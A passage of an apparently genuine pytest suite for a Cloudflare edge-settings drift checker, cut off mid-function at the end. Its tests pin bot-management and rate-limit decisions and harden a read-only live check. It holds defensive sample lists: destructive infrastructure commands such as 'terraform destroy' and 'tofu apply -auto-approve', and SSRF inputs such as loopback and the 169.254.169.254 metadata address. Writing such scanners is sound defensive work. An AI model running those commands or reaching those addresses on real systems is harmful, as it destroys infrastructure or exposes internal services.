# SPDX-License-Identifier: Apache-2.0
"""The zone's edge settings as code cannot drift silently (issue #613).

deploy/edge/desired-state.json is the single source. These tests pin the owner's
decisions, keep main.tf, the provider pin and the lock file in step with it, and
cover the read-only live check without any network.

The text scans below (no apply, no zone id) are defense in depth, not proof: a
determined edit can dodge a regex. What really enforces "nothing applies" is
structural (docs/edge.md, "Structural controls").
"""

from __future__ import annotations

import ast
import copy
import ipaddress
import json
import re
import shutil
import socket
import ssl
import subprocess
import urllib.error
import urllib.request
from importlib.machinery import SourceFileLoader
from importlib.util import module_from_spec, spec_from_loader
from pathlib import Path
from types import ModuleType
from typing import Any

import pytest

REPO = Path(__file__).resolve().parent.parent
EDGE = Path("deploy/edge")
FILES = (
    "desired-state.json",
    "main.tf",
    "versions.tf",
    "variables.tf",
    ".terraform.lock.hcl",
    "provider-fields.json",
    ".gitignore",
)
OVERRIDE_VARS = (
    "HTTPS_PROXY",
    "https_proxy",
    "HTTP_PROXY",
    "http_proxy",
    "ALL_PROXY",
    "all_proxy",
    "SSL_CERT_FILE",
    "SSL_CERT_DIR",
    "REQUESTS_CA_BUNDLE",
    "CURL_CA_BUNDLE",
    "SSLKEYLOGFILE",
    "SSLDEBUG",
    "OPENSSL_CONF",
    "OPENSSL_MODULES",
    "PYTHONHTTPSVERIFY",
)


def load(path: Path, name: str) -> ModuleType:
    import sys

    # Loading the checker must not write its bytecode next to it: that cache would
    # hold the token variable name, and the repository scan reads bytecode files.
    sys.dont_write_bytecode = True
    spec = spec_from_loader(name, SourceFileLoader(name, str(path)))
    assert spec is not None and spec.loader is not None
    module = module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


check: Any = load(REPO / "scripts" / "check-edge.py", "check_edge")
SENTINEL = "sentinel-token-value-123456"


REAL_ISOLATED = check._isolated


@pytest.fixture(autouse=True)
def isolated_interpreter(monkeypatch: pytest.MonkeyPatch) -> None:
    # pytest is not run with -I; the live path is tested as if it were.
    monkeypatch.setattr(check, "_isolated", lambda: True)


@pytest.fixture(autouse=True)
def clean_ambient_overrides(monkeypatch: pytest.MonkeyPatch) -> None:
    for name in OVERRIDE_VARS:
        monkeypatch.delenv(name, raising=False)


def desired() -> dict[str, Any]:
    data: dict[str, Any] = json.loads((REPO / EDGE / "desired-state.json").read_text())
    return data


@pytest.fixture
def root(tmp_path: Path) -> Path:
    """A scratch copy of the files the offline check reads."""
    (tmp_path / EDGE).mkdir(parents=True)
    for name in FILES:
        shutil.copy(REPO / EDGE / name, tmp_path / EDGE / name)
    return tmp_path


def write_desired(root: Path, data: dict[str, Any]) -> None:
    (root / EDGE / "desired-state.json").write_text(json.dumps(data))


def test_the_repository_agrees_with_itself(capsys: pytest.CaptureFixture[str]) -> None:
    assert check.main(["--offline"]) == 0
    assert "ok" in capsys.readouterr().out


def test_the_owner_decisions_are_pinned() -> None:
    bot = desired()["bot_management"]
    assert bot["ai_training"] == "disallow"  # training crawlers blocked
    assert bot["ai_search"] == "disabled"  # search and link previews allowed
    assert bot["bot_preference_sync_enabled"] is True  # managed robots.txt
    assert bot["is_robots_txt_managed"] is True
    assert bot["fight_mode"] is False  # Bot Fight Mode deferred
    assert bot["crawler_protection"] == "disabled"
    rule = desired()["rate_limit"]
    assert rule["expression"] == 'http.request.uri.path eq "/e/t"'
    assert rule["requests_per_period"] == 4
    assert rule["action"] == "block"
    assert rule["period"] == 10 == rule["mitigation_timeout"]  # Free plan


def mutate_bot(key: str, value: object) -> dict[str, Any]:
    data = copy.deepcopy(desired())
    data["bot_management"][key] = value
    return data


def mutate_rule(key: str, value: object) -> dict[str, Any]:
    data = copy.deepcopy(desired())
    data["rate_limit"][key] = value
    return data


def drop_bot_key() -> dict[str, Any]:
    data = copy.deepcopy(desired())
    del data["bot_management"]["ai_user"]
    return data


BAD = {
    "training allowed": mutate_bot("ai_training", "disabled"),
    "search blocked": mutate_bot("ai_search", "block"),
    "all AI blocked": mutate_bot("ai_bots_protection", "block"),
    "bot fight mode on": mutate_bot("fight_mode", True),
    "managed robots off": mutate_bot("is_robots_txt_managed", False),
    "sync off": mutate_bot("bot_preference_sync_enabled", False),
    "link maze on": mutate_bot("crawler_protection", "enabled"),
    "key dropped": drop_bot_key(),
    "regex expression": mutate_rule(
        "expression", 'http.request.uri.path matches "^/e/"'
    ),
    "whole zone": mutate_rule("expression", "true"),
    "old prefix expression": mutate_rule(
        "expression", 'starts_with(http.request.uri.path, "/e/")'
    ),
    "cap too low": mutate_rule("requests_per_period", 1),
    "cap too wide": mutate_rule("requests_per_period", 31),
    "challenge action": mutate_rule("action", "managed_challenge"),
    "longer period": mutate_rule("period", 60),
    "longer timeout": mutate_rule("mitigation_timeout", 600),
    "huge cap": mutate_rule("requests_per_period", 100000),
    "bool cap": mutate_rule("requests_per_period", True),
    "extra characteristic": mutate_rule(
        "characteristics", ["cf.colo.id", "ip.src", "x"]
    ),
}


@pytest.mark.parametrize("name", sorted(BAD))
def test_a_changed_decision_fails_the_offline_check(
    root: Path, name: str, capsys: pytest.CaptureFixture[str]
) -> None:
    write_desired(root, BAD[name])
    assert check.main(["--offline", "--root", str(root)]) == 1
    assert "FAIL" in capsys.readouterr().out


def test_main_tf_must_read_every_managed_key(root: Path) -> None:
    path = root / EDGE / "main.tf"
    path.write_text(path.read_text().replace("local.bot.ai_user", "var.x"))
    assert any("ai_user" in p for p in check.offline_problems(root))


def test_main_tf_must_not_own_the_rate_phase(root: Path) -> None:
    path = root / EDGE / "main.tf"
    path.write_text(path.read_text() + '\nresource "cloudflare_ruleset" "x" {}\n')
    assert any("cloudflare_ruleset" in p for p in check.offline_problems(root))


def test_the_real_main_tf_has_no_ruleset_resource() -> None:
    text = (REPO / EDGE / "main.tf").read_text()
    assert not re.search(r'^\s*resource\s+"cloudflare_ruleset"', text, re.M)


def test_main_tf_must_not_send_an_unmanaged_field(root: Path) -> None:
    path = root / EDGE / "main.tf"
    path.write_text(
        path.read_text().replace(
            "fight_mode  ", "enable_js   = true\n  fight_mode  ", 1
        )
    )
    assert any("enable_js" in p for p in check.offline_problems(root))


def test_every_provider_field_is_declared_managed_or_unmanaged(root: Path) -> None:
    bot = desired()["bot_management"]
    assert set(bot) == set(check.PROVIDER_FIELDS)
    unmanaged = {k for k, v in bot.items() if v == {"unmanaged": True}}
    assert "enable_js" in unmanaged and "ai_agents" in unmanaged
    assert unmanaged.isdisjoint(check.BOT_KEYS)
    data = copy.deepcopy(desired())
    del data["bot_management"]["enable_js"]
    write_desired(root, data)
    assert any("enable_js" in p for p in check.offline_problems(root))
    data = copy.deepcopy(desired())
    data["bot_management"]["enable_js"] = True  # a value where unmanaged is required
    write_desired(root, data)
    assert any("enable_js" in p for p in check.offline_problems(root))
    data = copy.deepcopy(desired())
    data["bot_management"]["brand_new_field"] = {"unmanaged": True}
    write_desired(root, data)
    assert any("brand_new_field" in p for p in check.offline_problems(root))


def test_main_tf_must_not_bypass_the_desired_state(root: Path) -> None:
    path = root / EDGE / "main.tf"
    path.write_text(path.read_text().replace("desired-state.json", "other.json"))
    assert any("desired-state.json" in p for p in check.offline_problems(root))


def test_the_lock_file_must_match_the_pin(root: Path) -> None:
    path = root / EDGE / ".terraform.lock.hcl"
    path.write_text(
        re.sub(r'version     = "[\d.]+"', 'version     = "0.0.1"', path.read_text())
    )
    assert any("lock" in p for p in check.offline_problems(root))


def test_the_provider_must_be_pinned_exactly(root: Path) -> None:
    path = root / EDGE / "versions.tf"
    path.write_text(path.read_text().replace('"= 5', '"~> 5'))
    assert any("pinned" in p for p in check.offline_problems(root))


def tracked_text() -> dict[str, str]:
    git = shutil.which("git")
    assert git is not None
    out = subprocess.run(  # noqa: S603 (fixed git command, no input)
        [git, "-C", str(REPO), "ls-files", "-z"],
        capture_output=True,
        check=True,
    ).stdout
    files: dict[str, str] = {}
    for raw in out.split(b"\0"):
        if not raw:
            continue
        path = REPO / raw.decode()
        if not path.is_file():
            continue
        data = path.read_bytes()
        if b"\0" in data[:4096]:
            continue  # binary
        files[raw.decode()] = data.decode("utf-8", "replace")
    return files


def test_the_text_scan_sees_the_whole_repository() -> None:
    files = tracked_text()
    assert len(files) > 100
    for name in ("deploy/edge/main.tf", ".github/workflows/ci.yml", "docs/edge.md"):
        assert name in files


MUTATING = [
    "tofu apply",
    "tofu apply -auto-approve",
    "tofu -chdir=deploy/edge apply",
    "terraform destroy",
    "env TF_VAR_x=1 tofu apply",
    "command tofu apply",
    "bash -c 'tofu apply'",
    'sh -c "terraform -chdir=x import a b"',
    "exec  tofu   import cloudflare_ruleset.x zones/a/b",
    "tofu plan && tofu apply",
    "tofu \\\n  apply",
    "apply:\n\ttofu plan",
    "make apply",
    "make -C deploy/edge destroy",
    "TERRAFORM APPLY",
    "terragrunt run-all apply",
]


@pytest.mark.parametrize("line", MUTATING)
def test_the_mutation_scan_bites(line: str) -> None:
    assert check.mutating_lines(line), line


@pytest.mark.parametrize(
    "line", ["tofu plan -input=false", "tofu validate", "# applies the reviewed plan"]
)
def test_the_mutation_scan_allows_read_only_commands(line: str) -> None:
    assert not check.mutating_lines(line), line


def test_nothing_in_the_repository_applies_destroys_or_imports() -> None:
    """Defense in depth, not proof: a regex over every tracked text file."""
    for name, text in tracked_text().items():
        if name == "tests/test_edge_settings.py":
            continue  # its own hostile samples
        assert not check.mutating_lines(text), name


def test_the_hex_scan_bites_and_skips_placeholders() -> None:
    assert check.zone_like_ids("zone 0123456789abcdef0123456789abcde0 x")
    assert check.zone_like_ids("a" * 31 + "b")
    assert not check.zone_like_ids("0" * 32)
    assert not check.zone_like_ids("f" * 32)
    assert not check.zone_like_ids("0123456789abcdef" * 4)  # 64 hex, a hash
    assert not check.zone_like_ids("0123456789abcdef0123456789abcdef")  # doc fixture


def test_no_zone_or_account_id_is_committed() -> None:
    """Defense in depth, not proof: every tracked text file outside test fixtures."""
    fixture_dirs = {"tests", "test", "fixtures"}
    for name, text in tracked_text().items():
        if fixture_dirs & set(name.split("/")) or name.endswith(".terraform.lock.hcl"):
            continue
        assert not check.zone_like_ids(text), name


def test_unmanaged_wording_never_claims_a_field_is_not_sent(root: Path) -> None:
    for claim in ("never sent", "are never sent by an apply", "not sent"):
        data = copy.deepcopy(desired())
        data["_comment"] = f"unmanaged fields are {claim}"
        write_desired(root, data)
        assert any("sent" in p for p in check.offline_problems(root)), claim
    write_desired(root, desired())
    main_tf = root / EDGE / "main.tf"
    original = main_tf.read_text()
    main_tf.write_text(original + "\n# An unmanaged field is never sent.\n")
    assert any("sent" in p for p in check.offline_problems(root))
    main_tf.write_text(original)
    (root / "docs").mkdir()
    shutil.copy(REPO / "docs" / "edge.md", root / "docs" / "edge.md")
    assert check.offline_problems(root) == []
    doc = root / "docs" / "edge.md"
    doc.write_text(doc.read_text() + "\nThose fields would never send.\n")
    assert any("sent" in p or "send" in p for p in check.offline_problems(root))


def test_the_real_files_state_that_sending_is_unverified() -> None:
    for path in (
        REPO / EDGE / "desired-state.json",
        REPO / EDGE / "main.tf",
        REPO / "docs" / "edge.md",
    ):
        assert "unverified" in path.read_text(), path.name


def manifest() -> dict[str, Any]:
    data: dict[str, Any] = json.loads(
        (REPO / EDGE / "provider-fields.json").read_text()
    )
    return data


def test_the_manifest_matches_the_checker_and_the_desired_state_independently(
    root: Path,
) -> None:
    m = manifest()
    assert m["provider_version"] == "5.29.0"
    assert "providers schema -json" in m["command"]
    assert set(m["sendable_fields"]) == set(check.PROVIDER_FIELDS)
    assert set(m["sendable_fields"]) == set(desired()["bot_management"])
    # drop a field from the checker's list AND the desired state only: the
    # manifest, generated from the provider schema, still notices
    data = copy.deepcopy(desired())
    del data["bot_management"]["suppress_session_score"]
    write_desired(root, data)
    reduced = tuple(f for f in check.PROVIDER_FIELDS if f != "suppress_session_score")
    saved = check.PROVIDER_FIELDS
    check.PROVIDER_FIELDS = reduced
    try:
        assert any("manifest" in p for p in check.offline_problems(root))
    finally:
        check.PROVIDER_FIELDS = saved


def test_the_manifest_version_must_match_the_pin(root: Path) -> None:
    path = root / EDGE / "provider-fields.json"
    data = json.loads(path.read_text())
    data["provider_version"] = "5.30.0"
    path.write_text(json.dumps(data))
    assert any("manifest" in p and "version" in p for p in check.offline_problems(root))


def test_a_missing_or_garbled_manifest_fails_the_offline_check(root: Path) -> None:
    path = root / EDGE / "provider-fields.json"
    path.write_text("{garbled")
    assert check.offline_problems(root)
    path.unlink()
    assert check.offline_problems(root)


gen: Any = load(REPO / "scripts" / "gen-provider-fields.py", "gen_provider_fields")


def schema(attributes: dict[str, Any]) -> dict[str, Any]:
    return {
        "provider_schemas": {
            "registry.opentofu.org/cloudflare/cloudflare": {
                "resource_schemas": {
                    "cloudflare_bot_management": {"block": {"attributes": attributes}}
                }
            }
        }
    }


def test_the_generator_reads_sendable_fields_from_a_schema() -> None:
    attrs = {
        "zone_id": {"type": "string", "required": True},
        "id": {"type": "string", "computed": True},
        "using_latest_model": {"type": "bool", "computed": True},
        "aisearch": {"type": "string", "optional": True, "computed": True},
        "enable_js": {"type": "bool", "optional": True, "computed": True},
        "bot_preference_sync_enabled": {"type": "bool", "optional": True},
    }
    result = gen.build_manifest(schema(attrs), "5.29.0", "cmd")
    assert result["sendable_fields"] == [
        "ai_search",
        "bot_preference_sync_enabled",
        "enable_js",
    ]
    assert result["computed_only"] == ["id", "using_latest_model"]
    assert result["provider_version"] == "5.29.0"
    assert result["command"] == "cmd"


def test_the_generator_refuses_a_schema_without_the_resource() -> None:
    with pytest.raises(ValueError):
        gen.build_manifest({"provider_schemas": {}}, "5.29.0", "cmd")


def test_ci_runs_the_offline_check() -> None:
    ci = (REPO / ".github" / "workflows" / "ci.yml").read_text()
    runs = [
        x.strip()
        for x in ci.splitlines()
        if not x.strip().startswith("#") and "python3 -I scripts/check-edge.py" in x
    ]
    assert runs == ["/usr/bin/python3 -I scripts/check-edge.py --offline"]


def test_the_doc_names_every_setting_and_scope() -> None:
    doc = (REPO / "docs" / "edge.md").read_text()
    for key in desired()["bot_management"]:
        assert f"`{key}`" in doc, key
    for key in desired()["rate_limit"]:
        assert f"`{key}`" in doc, key
    for scope in (
        "Bot Management Read",
        "Bot Management Write",
        "Zone WAF Read",
        "Zone WAF Write",
    ):
        assert scope in doc, scope


def test_the_doc_states_the_structural_controls_and_the_unapproved_apply() -> None:
    doc = (REPO / "docs" / "edge.md").read_text()
    assert "## Structural controls" in doc
    assert "defense in depth" in doc
    assert "NOT approved" in doc
    assert "MANUAL" in doc and "never replace" in doc.lower()
    assert "NOT approved" in (REPO / EDGE / "main.tf").read_text()


def managed_values() -> dict[str, Any]:
    return {
        k: v for k, v in desired()["bot_management"].items() if v != {"unmanaged": True}
    }


def live_bot() -> dict[str, Any]:
    return {**managed_values(), "enable_js": True, "ai_agents": {"x": 1}}


def live_rules() -> dict[str, Any]:
    rule = {k: v for k, v in desired()["rate_limit"].items() if k in check.RL_KEYS[:4]}
    rule["id"] = "abc"
    rule["ratelimit"] = {
        k: desired()["rate_limit"][k]
        for k in (
            "characteristics",
            "period",
            "requests_per_period",
            "mitigation_timeout",
        )
    }
    return {"rules": [rule]}


def test_live_that_agrees_has_no_differences() -> None:
    assert check.bot_differences(desired()["bot_management"], live_bot()) == []
    changed = {**live_bot(), "enable_js": False}  # unmanaged: not ours
    assert check.bot_differences(desired()["bot_management"], changed) == []
    assert check.rate_differences(desired()["rate_limit"], live_rules()) == []


def test_a_dashboard_change_is_reported() -> None:
    live = live_bot()
    live["fight_mode"] = True
    live.pop("ai_training")
    found = check.bot_differences(desired()["bot_management"], live)
    assert len(found) == 2 and any("<absent>" in f for f in found)


def other_rule() -> dict[str, Any]:
    return {"ref": "someone_else", "expression": "true", "action": "log"}


def test_other_sites_rules_are_not_ours_and_not_drift() -> None:
    rl = desired()["rate_limit"]
    live = live_rules()
    live["rules"] = [other_rule(), live["rules"][0], other_rule()]
    assert check.rate_differences(rl, live) == []
    found = check.rate_differences(rl, {"rules": [other_rule()]})
    assert found and "not present" in found[0] and "MANUAL" in found[0]


def test_our_rule_is_found_by_expression_when_the_ref_differs() -> None:
    live = live_rules()
    live["rules"][0]["ref"] = "renamed"
    found = check.rate_differences(desired()["rate_limit"], live)
    assert found and all("ref" in f for f in found)


def test_rate_rule_drift_is_reported() -> None:
    live = live_rules()
    live["rules"][0]["ratelimit"]["requests_per_period"] = 9999
    assert check.rate_differences(desired()["rate_limit"], live)
    assert check.rate_differences(desired()["rate_limit"], {"rules": []})
    assert check.rate_differences(desired()["rate_limit"], None)
    disabled = live_rules()
    disabled["rules"][0]["enabled"] = False
    assert any(
        "disabled" in f
        for f in check.rate_differences(desired()["rate_limit"], disabled)
    )


def test_a_missing_entrypoint_is_reported_not_unreadable(
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    def fake(path: str, token: str) -> Any:
        if path.endswith("entrypoint"):
            raise check.NotFound("HTTP 404")
        return live_bot()

    monkeypatch.setenv(check.TOKEN_ENV, SENTINEL)
    monkeypatch.setattr(check, "api_result", fake)
    assert check.main(["--live", "--zone-id", "0" * 32]) == 1
    assert "not present" in capsys.readouterr().out


def test_a_malformed_rule_is_drift_not_a_crash() -> None:
    rl = desired()["rate_limit"]
    assert check.rate_differences(rl, {"rules": ["nope"]})
    broken = live_rules()
    broken["rules"][0]["ratelimit"] = "nope"
    assert check.rate_differences(rl, broken)


def test_get_refuses_plain_http_and_a_token_for_another_host() -> None:
    with pytest.raises(check.Unreadable):
        check.get("http://api.cloudflare.com/client/v4/x", None)
    with pytest.raises(check.Unreadable):
        check.get("https://example.invalid/robots.txt", SENTINEL)


def test_get_never_follows_a_redirect_and_ignores_proxies(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    seen: list[Any] = []

    def fake_build_opener(*handlers: Any) -> Any:
        seen.extend(handlers)

        class Stub:
            def open(self, *args: Any, **kwargs: Any) -> Any:
                raise urllib.error.URLError("stop")

        return Stub()

    monkeypatch.setattr(urllib.request, "build_opener", fake_build_opener)
    with pytest.raises(check.Unreadable):
        check.get(check.API + "/zones/x", SENTINEL)
    redirect = [h for h in seen if isinstance(h, type) and h.__name__ == "NoRedirect"]
    assert len(redirect) == 1
    assert (
        redirect[0]().redirect_request(None, None, 302, "", {}, "https://x.invalid/")
        is None
    )
    proxies = [h for h in seen if isinstance(h, urllib.request.ProxyHandler)]
    assert (
        len(proxies) == 1 and vars(proxies[0])["proxies"] == {}
    )  # no environment proxy
    https = [h for h in seen if isinstance(h, urllib.request.HTTPSHandler)]
    assert len(https) == 1  # an explicit TLS handler, not the implicit default


def test_the_real_opener_has_no_proxy_handler_from_the_environment(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setenv("HTTPS_PROXY", "http://proxy.invalid:3128")
    opener = urllib.request.build_opener(
        urllib.request.ProxyHandler({}),
        urllib.request.HTTPSHandler(context=check.ssl.create_default_context()),
    )
    # an empty ProxyHandler installs no *_open methods, so it is left out, and the
    # default environment-reading one is not added beside it
    assert not [
        h
        for h in vars(opener)["handlers"]
        if isinstance(h, urllib.request.ProxyHandler)
    ]


@pytest.mark.parametrize("name", OVERRIDE_VARS)
def test_a_proxy_or_ca_override_refuses_before_any_socket(
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str], name: str
) -> None:
    def no_socket(*args: Any, **kwargs: Any) -> Any:
        raise AssertionError("a socket was opened")

    for target in ("create_connection", "getaddrinfo", "socket"):
        monkeypatch.setattr(check.socket, target, no_socket)
    monkeypatch.setattr(urllib.request, "build_opener", no_socket)
    monkeypatch.setenv(check.TOKEN_ENV, SENTINEL)
    monkeypatch.setenv(name, "/somewhere/else")
    code = check.main(["--live", "--zone-id", "0" * 32])
    out = capsys.readouterr()
    assert code == 2
    assert out.err.strip() == "REFUSED proxy, CA or TLS debug override variable is set"
    assert SENTINEL not in out.out + out.err
    with pytest.raises(check.Unreadable):  # the same guard inside get()
        check.get(check.API + "/zones/x", SENTINEL)


def test_the_public_robots_fetch_is_not_blocked_by_the_override_guard() -> None:
    assert check.override_variables_set({}) == []
    assert check.override_variables_set({"HTTPS_PROXY": "x"}) == ["HTTPS_PROXY"]


def test_a_failed_read_is_exit_2_and_never_prints_the_token(
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    def refuse(path: str, token: str) -> Any:
        raise check.Unreadable("HTTP 403")

    monkeypatch.setenv(check.TOKEN_ENV, SENTINEL)
    monkeypatch.setattr(check, "api_result", refuse)
    code = check.main(["--live", "--zone-id", "0" * 32])
    out = capsys.readouterr()
    assert code == 2
    assert SENTINEL not in out.out + out.err


def test_live_needs_a_token_and_a_zone(
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    monkeypatch.delenv(check.TOKEN_ENV, raising=False)
    assert check.main(["--live", "--zone-id", "0" * 32]) == 2
    monkeypatch.setenv(check.TOKEN_ENV, SENTINEL)
    assert check.main(["--live", "--zone-id", "not-a-zone"]) == 2


def test_live_reports_drift_and_agreement(
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str], tmp_path: Path
) -> None:
    answers = {"bot_management": live_bot(), "entrypoint": live_rules()}

    def fake(path: str, token: str) -> Any:
        assert token == SENTINEL
        return answers[
            "bot_management" if path.endswith("bot_management") else "entrypoint"
        ]

    monkeypatch.setenv(check.TOKEN_ENV, SENTINEL)
    monkeypatch.setattr(check, "api_result", fake)
    saved = tmp_path / "saved.json"
    args = ["--live", "--zone-id", "0" * 32, "--save", str(saved)]
    assert check.main(args) == 0
    assert oct(saved.stat().st_mode & 0o777) == "0o600"
    assert SENTINEL not in saved.read_text()
    answers["bot_management"]["fight_mode"] = True
    assert check.main(["--live", "--zone-id", "0" * 32]) == 1
    assert "DRIFT bot_management.fight_mode" in capsys.readouterr().out


def test_a_missing_managed_robots_block_is_drift(
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    monkeypatch.setenv(check.TOKEN_ENV, SENTINEL)
    monkeypatch.setattr(
        check,
        "api_result",
        lambda path, token: live_bot() if "bot_" in path else live_rules(),
    )
    page = {"text": "User-agent: *\nDisallow: /x\n"}
    seen: list[str] = []

    def fake_fetch(host: str) -> str:
        seen.append(host)
        return page["text"]

    monkeypatch.setattr(check, "fetch_robots", fake_fetch)
    args = ["--live", "--zone-id", "0" * 32, "--site-host", "Links.Example.com"]
    assert check.main(args) == 1
    page["text"] = "# BEGIN Cloudflare Managed content\nUser-agent: GPTBot\n"
    assert check.main(args) == 0
    assert seen == ["links.example.com"] * 2
    assert "managed block" in capsys.readouterr().out


def test_saving_over_an_existing_file_is_exit_2_not_a_crash(
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str], tmp_path: Path
) -> None:
    monkeypatch.setenv(check.TOKEN_ENV, SENTINEL)
    monkeypatch.setattr(
        check,
        "api_result",
        lambda path, token: live_bot() if "bot_" in path else live_rules(),
    )
    saved = tmp_path / "saved.json"
    saved.write_text("keep")
    args = ["--live", "--zone-id", "0" * 32, "--save", str(saved)]
    assert check.main(args) == 2
    assert saved.read_text() == "keep"
    assert SENTINEL not in capsys.readouterr().err


def edit_file(root: Path, name: str, old: str, new: str) -> None:
    path = root / EDGE / name
    text = path.read_text()
    assert old in text
    path.write_text(text.replace(old, new, 1))


def test_the_doc_lists_the_open_owner_decisions() -> None:
    doc = (REPO / "docs" / "edge.md").read_text()
    assert "## Open owner decisions" in doc
    for topic in ("zone", "repository", "State", "requests_per_period"):
        assert topic in doc.split("## Open owner decisions", 1)[1], topic


# --- --site-host: no SSRF -----------------------------------------------------

GOOD_HOSTS = [
    "links.example.com",
    "Links.Example.COM",
    "a-b.example.org",
    "x1.y2.example.net",
]
BAD_HOSTS = [
    "",
    "localhost",
    "example",  # a single label
    "127.0.0.1",
    "1.2.3.4",
    "0x7f.0.0.1",
    "2130706433",
    "[::1]",
    "::1",
    "fe80::1",
    "example.com:443",
    "example.com:8080",
    "user@example.com",
    "user:pw@example.com",
    "https://example.com",
    "example.com/path",
    "example.com?x=1",
    "example.com#x",
    "exa mple.com",
    "example.com.",
    "-bad.example.com",
    "bad-.example.com",
    "a..example.com",
    "ex\x00ample.com",
    "ex\nample.com",
    "\u00fcber.example.com",
    "example.com\\evil.com",
    "a" * 64 + ".example.com",
    ("a." * 130) + "com",
    "example.123",
]


@pytest.mark.parametrize("host", GOOD_HOSTS)
def test_site_host_accepts_plain_hostnames(host: str) -> None:
    assert check.parse_site_host(host) == host.lower()


@pytest.mark.parametrize("host", BAD_HOSTS)
def test_site_host_refuses_everything_else(host: str) -> None:
    assert check.parse_site_host(host) is None


def fake_resolver(addresses: list[str]) -> Any:
    def getaddrinfo(host: str, port: Any, *args: Any, **kwargs: Any) -> Any:
        return [
            (
                socket.AF_INET6 if ":" in a else socket.AF_INET,
                socket.SOCK_STREAM,
                6,
                "",
                (a, 443),
            )
            for a in addresses
        ]

    return getaddrinfo


BLOCKED = [
    "127.0.0.1",
    "127.255.255.254",
    "10.0.0.1",
    "172.16.5.4",
    "172.31.255.255",
    "192.168.1.1",
    "169.254.169.254",
    "100.64.0.1",
    "224.0.0.1",
    "239.255.255.250",
    "240.0.0.1",
    "255.255.255.255",
    "0.0.0.0",  # noqa: S104 (a blocked-range sample, not a bind)
    "192.0.2.1",
    "::1",
    "::",
    "fe80::1",
    "fc00::1",
    "fd12:3456::1",
    "ff02::1",
    "2001:db8::1",
    "::ffff:127.0.0.1",
    "::ffff:10.1.2.3",
    "::ffff:169.254.169.254",
    "64:ff9b::7f00:1",
    "2002:7f00:1::1",
    "2002:a9fe:a9fe::1",
]


@pytest.mark.parametrize("address", BLOCKED)
def test_a_blocked_address_is_refused(
    monkeypatch: pytest.MonkeyPatch, address: str
) -> None:
    ipaddress.ip_address(address)  # the sample itself is well formed
    monkeypatch.setattr(check.socket, "getaddrinfo", fake_resolver([address]))
    with pytest.raises(check.Unreadable):
        check.public_addresses("links.example.com")


def test_one_bad_address_in_a_mix_refuses_the_host(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    mix = ["93.184.216.34", "2606:2800:220:1::1", "127.0.0.1"]
    monkeypatch.setattr(check.socket, "getaddrinfo", fake_resolver(mix))
    with pytest.raises(check.Unreadable):
        check.public_addresses("links.example.com")
    monkeypatch.setattr(check.socket, "getaddrinfo", fake_resolver(mix[:2]))
    assert check.public_addresses("links.example.com")[0] == "93.184.216.34"


def test_an_empty_or_failing_resolution_is_refused(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(check.socket, "getaddrinfo", fake_resolver([]))
    with pytest.raises(check.Unreadable):
        check.public_addresses("links.example.com")

    def boom(*args: Any, **kwargs: Any) -> Any:
        raise socket.gaierror("no")

    monkeypatch.setattr(check.socket, "getaddrinfo", boom)
    with pytest.raises(check.Unreadable):
        check.public_addresses("links.example.com")


def test_the_robots_fetch_connects_to_the_validated_address_with_sni(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(check.socket, "getaddrinfo", fake_resolver(["93.184.216.34"]))
    connected: list[Any] = []
    wrapped: list[Any] = []

    class FakeContext:
        def wrap_socket(self, sock: Any, server_hostname: str) -> Any:
            wrapped.append(server_hostname)
            raise OSError("stop here")

    def fake_create_connection(address: Any, timeout: Any = None) -> Any:
        connected.append(address)

        class FakeSock:
            def settimeout(self, value: Any) -> None:
                pass

            def close(self) -> None:
                pass

        return FakeSock()

    monkeypatch.setattr(check.socket, "create_connection", fake_create_connection)
    monkeypatch.setattr(check.ssl, "create_default_context", lambda: FakeContext())
    with pytest.raises(check.Unreadable):
        check.fetch_robots("links.example.com")
    assert connected == [("93.184.216.34", 443)]  # never the hostname
    assert wrapped == ["links.example.com"]  # SNI and certificate name


@pytest.mark.parametrize("status", [301, 302, 307, 403, 404])
def test_the_robots_fetch_refuses_redirects_and_other_statuses(
    monkeypatch: pytest.MonkeyPatch, status: int
) -> None:
    monkeypatch.setattr(check.socket, "getaddrinfo", fake_resolver(["93.184.216.34"]))

    class Response:
        def __init__(self) -> None:
            self.status = status

    class Conn:
        sock = None

        def __init__(self, *a: Any, **k: Any) -> None:
            pass

        def request(self, *a: Any, **k: Any) -> None:
            pass

        def getresponse(self) -> Any:
            return Response()

        def close(self) -> None:
            pass

    monkeypatch.setattr(check, "PinnedHTTPSConnection", Conn)
    with pytest.raises(check.Unreadable):
        check.fetch_robots("links.example.com")


def test_there_is_no_robots_url_argument_any_more() -> None:
    with pytest.raises(SystemExit):
        check.main(
            ["--live", "--zone-id", "0" * 32, "--robots-url", "https://x.invalid/"]
        )


@pytest.mark.parametrize(
    "host", ["127.0.0.1", "http://x", "a b", "ex\x00.com", "\u00fc.example.com"]
)
def test_a_bad_site_host_is_exit_2_before_any_request(
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str], host: str
) -> None:
    def never(*args: Any, **kwargs: Any) -> Any:
        raise AssertionError("network used")

    monkeypatch.setenv(check.TOKEN_ENV, SENTINEL)
    monkeypatch.setattr(check, "api_result", never)
    monkeypatch.setattr(check, "fetch_robots", never)
    monkeypatch.setattr(check.socket, "getaddrinfo", never)
    code = check.main(["--live", "--zone-id", "0" * 32, "--site-host", host])
    out = capsys.readouterr()
    assert code == 2
    assert SENTINEL not in out.out + out.err
    assert "Traceback" not in out.err


# --- robust failure: fixed message, exit 2, no exception text -----------------


@pytest.mark.parametrize(
    "content", [None, b"{not json", b"\xff\xfe", b"[]", b'{"schema": 1}']
)
def test_a_missing_or_malformed_desired_state_is_exit_2_under_live(
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
    tmp_path: Path,
